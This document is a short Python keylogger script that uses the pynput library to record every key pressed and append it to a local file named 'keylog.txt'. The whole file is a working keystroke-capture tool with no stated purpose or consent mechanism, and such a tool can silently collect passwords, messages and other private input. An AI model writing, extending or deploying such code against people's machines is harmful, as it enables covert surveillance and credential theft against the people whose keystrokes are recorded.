from pynput.keyboard import Listener

LOG_FILE = "keylog.txt"

def log_key(key):
    key = str(key).replace("'", "")
    with open(LOG_FILE, "a") as f:
        f.write(key + "\n")

with Listener(on_press=log_key) as listener:
    listener.join()
